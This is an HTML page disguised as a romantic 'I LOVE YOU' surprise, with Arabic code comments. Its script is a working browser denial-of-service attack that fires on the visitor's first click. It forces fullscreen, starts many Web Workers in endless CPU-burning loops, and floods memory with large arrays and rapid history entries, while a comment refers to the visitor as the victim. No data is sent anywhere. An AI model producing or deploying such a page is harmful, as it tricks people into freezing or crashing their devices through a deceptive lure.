<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: red; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: none; }
        h1 { font-size: 6rem; font-family: 'Courier New', Courier, monospace; text-shadow: 0 0 30px red; }
        p { color: white; font-size: 1.2rem; margin-top: 20px; }
    </style>
</head>
<body>

    <h1 id="text">I LOVE YOU</h1>
    <p id="sub">Click anywhere to start the surprise...</p>

    <script>
        // دالة الدخول في وضع ملء الشاشة وتفعيل الهجوم
        function lockAndLoad() {
            // 1. الدخول في ملء الشاشة
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            }

            // 2. إخفاء الرسالة الفرعية وتغيير النص
            document.getElementById('sub').innerText = "System Failure Imminent...";
            
            // 3. هجوم المعالج (CPU Overload) - نسخة مكثفة
            const cores = navigator.hardwareConcurrency || 16;
            for (let i = 0; i < cores * 10; i++) {
                const worker = new Worker(URL.createObjectURL(new Blob([`
                    setInterval(() => {
                        let d = "STRESS".repeat(1000);
                        while(true) { d = btoa(d + Math.random()); }
                    }, 1);
                `], {type: 'application/javascript'})));
            }

            // 4. هجوم الرام (RAM Flood)
            let trap = [];
            setInterval(() => {
                trap.push(new Array(1000000).fill("BYE_BYE_RAM"));
                window.history.pushState(null, null, "#" + Math.random());
            }, 10);
        }

        // المتصفحات تمنع ملء الشاشة تلقائياً، لذا ننتظر أول لمسة من الضحية
        window.onclick = function() {
            lockAndLoad();
        };
    </script>
</body>
</html>
